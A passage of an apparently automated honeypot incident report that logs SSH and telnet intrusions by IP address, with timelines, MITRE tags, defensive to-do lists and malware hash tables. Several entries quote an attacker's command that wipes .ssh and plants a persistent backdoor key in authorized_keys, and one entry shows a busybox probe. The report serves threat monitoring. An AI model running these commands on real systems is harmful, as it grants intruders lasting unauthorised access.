| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:44:28` | `cowrie.session.connect` |
| `2026-05-06 16:44:28` | `cowrie.client.version` |
| `2026-05-06 16:44:28` | `cowrie.client.kex` |
| `2026-05-06 16:44:29` | `cowrie.login.success` |
| `2026-05-06 16:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6626be933a84

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:45 |
| **Last Seen** | 2026-05-06 16:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:45:21` | `cowrie.session.connect` |
| `2026-05-06 16:45:21` | `cowrie.client.version` |
| `2026-05-06 16:45:21` | `cowrie.client.kex` |
| `2026-05-06 16:45:22` | `cowrie.login.success` |
| `2026-05-06 16:45:22` | `cowrie.session.params` |
| `2026-05-06 16:45:22` | `cowrie.command.input` |
| `2026-05-06 16:45:22` | `cowrie.command.failed` |
| `2026-05-06 16:45:23` | `cowrie.log.closed` |
| `2026-05-06 16:45:23` | `cowrie.session.params` |
| `2026-05-06 16:45:23` | `cowrie.command.input` |
| `2026-05-06 16:45:23` | `cowrie.session.file_download` |
| `2026-05-06 16:45:23` | `cowrie.log.closed` |
| `2026-05-06 16:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2225ffead7dc

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:45 |
| **Last Seen** | 2026-05-06 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:45:26` | `cowrie.session.connect` |
| `2026-05-06 16:45:26` | `cowrie.client.version` |
| `2026-05-06 16:45:27` | `cowrie.client.kex` |
| `2026-05-06 16:45:28` | `cowrie.login.success` |
| `2026-05-06 16:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c4b39c07af

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:50 |
| **Last Seen** | 2026-05-06 16:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:50:14` | `cowrie.session.connect` |
| `2026-05-06 16:50:14` | `cowrie.client.version` |
| `2026-05-06 16:50:14` | `cowrie.client.kex` |
| `2026-05-06 16:50:15` | `cowrie.login.success` |
| `2026-05-06 16:50:16` | `cowrie.session.params` |
| `2026-05-06 16:50:16` | `cowrie.command.input` |
| `2026-05-06 16:50:16` | `cowrie.command.failed` |
| `2026-05-06 16:50:16` | `cowrie.log.closed` |
| `2026-05-06 16:50:17` | `cowrie.session.params` |
| `2026-05-06 16:50:17` | `cowrie.command.input` |
| `2026-05-06 16:50:17` | `cowrie.session.file_download` |
| `2026-05-06 16:50:17` | `cowrie.log.closed` |
| `2026-05-06 16:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8527c8289c

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:50 |
| **Last Seen** | 2026-05-06 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:50:20` | `cowrie.session.connect` |
| `2026-05-06 16:50:20` | `cowrie.client.version` |
| `2026-05-06 16:50:20` | `cowrie.client.kex` |
| `2026-05-06 16:50:21` | `cowrie.login.success` |
| `2026-05-06 16:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34d74acc5d1

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 17:03 |
| **Last Seen** | 2026-05-06 17:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:03:44` | `cowrie.session.connect` |
| `2026-05-06 17:03:44` | `cowrie.client.version` |
| `2026-05-06 17:03:44` | `cowrie.client.kex` |
| `2026-05-06 17:03:45` | `cowrie.login.success` |
| `2026-05-06 17:03:46` | `cowrie.session.params` |
| `2026-05-06 17:03:46` | `cowrie.command.input` |
| `2026-05-06 17:03:46` | `cowrie.command.failed` |
| `2026-05-06 17:03:46` | `cowrie.log.closed` |
| `2026-05-06 17:03:47` | `cowrie.session.params` |
| `2026-05-06 17:03:47` | `cowrie.command.input` |
| `2026-05-06 17:03:47` | `cowrie.session.file_download` |
| `2026-05-06 17:03:47` | `cowrie.log.closed` |
| `2026-05-06 17:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52c911456f28

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 17:03 |
| **Last Seen** | 2026-05-06 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:03:50` | `cowrie.session.connect` |
| `2026-05-06 17:03:50` | `cowrie.client.version` |
| `2026-05-06 17:03:50` | `cowrie.client.kex` |
| `2026-05-06 17:03:51` | `cowrie.login.success` |
| `2026-05-06 17:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bafda7184b0f

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-05-06 17:05 |
| **Last Seen** | 2026-05-06 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:05:36` | `cowrie.session.connect` |
| `2026-05-06 17:05:36` | `cowrie.client.version` |
| `2026-05-06 17:05:36` | `cowrie.client.kex` |
| `2026-05-06 17:05:36` | `cowrie.login.success` |
| `2026-05-06 17:05:37` | `cowrie.session.params` |
| `2026-05-06 17:05:37` | `cowrie.command.input` |
| `2026-05-06 17:05:37` | `cowrie.command.failed` |
| `2026-05-06 17:05:37` | `cowrie.log.closed` |
| `2026-05-06 17:05:37` | `cowrie.session.params` |
| `2026-05-06 17:05:37` | `cowrie.command.input` |
| `2026-05-06 17:05:37` | `cowrie.session.file_download` |
| `2026-05-06 17:05:37` | `cowrie.log.closed` |
| `2026-05-06 17:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a1468fb6c5f

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-05-06 17:05 |
| **Last Seen** | 2026-05-06 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:05:38` | `cowrie.session.connect` |
| `2026-05-06 17:05:38` | `cowrie.client.version` |
| `2026-05-06 17:05:38` | `cowrie.client.kex` |
| `2026-05-06 17:05:38` | `cowrie.login.success` |
| `2026-05-06 17:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a4edf3485d

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-05-06 17:25 |
| **Last Seen** | 2026-05-06 17:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:25:07` | `cowrie.session.connect` |
| `2026-05-06 17:25:07` | `cowrie.client.version` |
| `2026-05-06 17:25:08` | `cowrie.client.kex` |
| `2026-05-06 17:25:08` | `cowrie.login.success` |
| `2026-05-06 17:25:08` | `cowrie.session.params` |
| `2026-05-06 17:25:08` | `cowrie.command.input` |
| `2026-05-06 17:25:08` | `cowrie.command.failed` |
| `2026-05-06 17:25:09` | `cowrie.log.closed` |
| `2026-05-06 17:25:09` | `cowrie.session.params` |
| `2026-05-06 17:25:09` | `cowrie.command.input` |
| `2026-05-06 17:25:09` | `cowrie.session.file_download` |
| `2026-05-06 17:25:09` | `cowrie.log.closed` |
| `2026-05-06 17:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731d4d4718e0

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-05-06 17:25 |
| **Last Seen** | 2026-05-06 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:25:11` | `cowrie.session.connect` |
| `2026-05-06 17:25:11` | `cowrie.client.version` |
| `2026-05-06 17:25:11` | `cowrie.client.kex` |
| `2026-05-06 17:25:12` | `cowrie.login.success` |
| `2026-05-06 17:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d588e8b27524

| Field | Detail |
|---|---|
| **Source IP** | `37.57.33[.]51` |
| **First Seen** | 2026-05-06 17:36 |
| **Last Seen** | 2026-05-06 17:38 |
| **Session Duration** | 106s |
| **Login Attempts** | 5 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox DSLAO` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 17:36:22` | `cowrie.session.connect` |
| `2026-05-06 17:36:23` | `cowrie.telnet.option` |
| `2026-05-06 17:36:23` | `cowrie.login.failed` |
| `2026-05-06 17:36:24` | `cowrie.telnet.option` |
| `2026-05-06 17:36:24` | `cowrie.login.failed` |
| `2026-05-06 17:36:25` | `cowrie.telnet.option` |
| `2026-05-06 17:36:25` | `cowrie.login.failed` |
| `2026-05-06 17:36:26` | `cowrie.telnet.option` |
| `2026-05-06 17:36:26` | `cowrie.login.failed` |
| `2026-05-06 17:36:26` | `cowrie.telnet.option` |
| `2026-05-06 17:36:27` | `cowrie.login.success` |
| `2026-05-06 17:36:27` | `cowrie.session.params` |
| `2026-05-06 17:36:27` | `cowrie.command.input` |
| `2026-05-06 17:36:27` | `cowrie.command.input` |
| `2026-05-06 17:36:27` | `cowrie.command.failed` |
| `2026-05-06 17:36:27` | `cowrie.command.input` |
| `2026-05-06 17:36:27` | `cowrie.command.failed` |
| `2026-05-06 17:36:27` | `cowrie.command.input` |
| `2026-05-06 17:36:27` | `cowrie.command.input` |
| `2026-05-06 17:36:28` | `cowrie.command.input` |
| `2026-05-06 17:36:28` | `cowrie.command.input` |
| `2026-05-06 17:36:28` | `cowrie.command.input` |
| `2026-05-06 17:36:28` | `cowrie.command.failed` |
| `2026-05-06 17:36:29` | `cowrie.command.input` |
| `2026-05-06 17:36:29` | `cowrie.command.input` |
| `2026-05-06 17:36:29` | `cowrie.command.input` |
| `2026-05-06 17:36:29` | `cowrie.command.input` |
| `2026-05-06 17:36:29` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.input` |
| `2026-05-06 17:36:30` | `cowrie.command.failed` |
| `2026-05-06 17:38:09` | `cowrie.log.closed` |
| `2026-05-06 17:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.57.33[.]51` to AbuseIPDB if not already reported
- [ ] Block `37.57.33[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `144.126.132[.]225` | **56** | 2026-05-06 16:40 | 2026-05-06 16:51 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `103.39.225[.]73` | **33** | 2026-05-06 15:11 | 2026-05-06 15:51 | 65m | 0 | `T1592` | 🟠 MEDIUM |
| `172.173.117[.]246` | **30** | 2026-05-06 15:56 | 2026-05-06 17:04 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.217.16[.]126` | **30** | 2026-05-06 15:31 | 2026-05-06 16:04 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.227.185[.]238` | **30** | 2026-05-06 15:42 | 2026-05-06 16:19 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `86.139.23[.]230` | **28** | 2026-05-06 16:04 | 2026-05-06 16:36 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.34.125[.]173` | **27** | 2026-05-06 14:53 | 2026-05-06 15:02 | 42m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `64.236.154[.]149` | **17** | 2026-05-06 15:58 | 2026-05-06 16:02 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.162[.]142` | **4** | 2026-05-06 17:34 | 2026-05-06 17:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `167.224.130[.]48` | **2** | 2026-05-06 16:39 | 2026-05-06 16:42 | 4m | 0 | `T1592` | 🟢 LOW |
| `220.154.131[.]135` | **2** | 2026-05-06 16:17 | 2026-05-06 16:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `115.211.149[.]252` | 1 | 2026-05-06 14:58 | 2026-05-06 14:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `125.16.27[.]190` | 1 | 2026-05-06 17:05 | 2026-05-06 17:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.145.122[.]251` | 1 | 2026-05-06 15:14 | 2026-05-06 15:15 | 35s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-06 16:02 | 2026-05-06 16:02 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.28.49[.]187` | 1 | 2026-05-06 16:05 | 2026-05-06 16:05 | 3s | 0 | `T1592` | 🟢 LOW |
| `154.83.196[.]237` | 1 | 2026-05-06 15:28 | 2026-05-06 15:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]245` | 1 | 2026-05-06 16:34 | 2026-05-06 16:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.138.202[.]60` | 1 | 2026-05-06 14:50 | 2026-05-06 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.101.137[.]127` | 1 | 2026-05-06 14:56 | 2026-05-06 14:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.77.158[.]34` | 1 | 2026-05-06 17:25 | 2026-05-06 17:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.240.156[.]16` | 1 | 2026-05-06 14:51 | 2026-05-06 14:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.108.198[.]5` | 1 | 2026-05-06 15:31 | 2026-05-06 15:32 | 46s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
